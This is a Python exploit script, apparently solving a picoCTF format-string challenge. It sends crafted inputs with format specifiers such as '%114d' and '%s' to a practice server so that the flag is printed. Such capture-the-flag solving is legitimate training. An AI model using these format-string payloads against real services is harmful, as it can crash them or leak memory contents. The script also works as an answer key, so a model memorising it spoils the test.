#!/usr/bin/env python3
import socket
import time

HOST = "mimas.picoctf.net"
PORT = 60133

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((HOST, PORT))

def recv_until(s, delim):
    data = b""
    while True:
        try:
            ch = s.recv(1)
        except socket.timeout:
            break
        if not ch:
            break
        data += ch
        if data.endswith(delim):
            break
    return data

# Phase 1: Patrick
data = recv_until(s, b"recommendation: ")
print("[*] Phase 1: Patrick")
print(data.decode(errors='replace'))

s.sendall(b"Gr%114d_Cheese\n")
time.sleep(0.5)

# Phase 2: Bob  
data = recv_until(s, b"recommendation: ")
print("[*] Phase 2: Bob")
print(data.decode(errors='replace'))

s.sendall(b"Cla%sic_Che%s%steak\n")
time.sleep(1)

# Read remaining output (flag should be here)
try:
    data = s.recv(4096)
    print("[*] Output:")
    print(data.decode(errors='replace'))
except socket.timeout:
    pass

s.close()
